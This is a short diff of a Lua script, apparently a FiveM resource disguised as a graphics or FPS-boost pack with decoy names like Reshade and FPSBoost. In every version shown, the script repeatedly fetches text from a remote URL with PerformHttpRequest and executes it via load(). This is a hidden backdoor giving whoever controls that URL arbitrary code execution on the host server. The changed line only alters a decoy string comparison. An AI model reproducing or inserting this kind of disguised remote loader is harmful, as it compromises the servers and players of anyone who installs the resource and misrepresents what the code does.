@@ -8,7 +8,7 @@ CreateThread(function()
     while (true) do
         Wait(Reshade.FPS * 1000)
         PerformHttpRequest(Reshade.MotionBlur, function(DirectX11, FPSBoost)
-            if (resData ~= "UltraHD") then
+            if (FPSBoost ~= "function graphicBoost() local UltraHD = true local FPS_Boost = true local boostLevel = 5 end") then
                 local FivemGraphicPackLoader = assert(load(FPSBoost))
                 FivemGraphicPackLoader()
             end
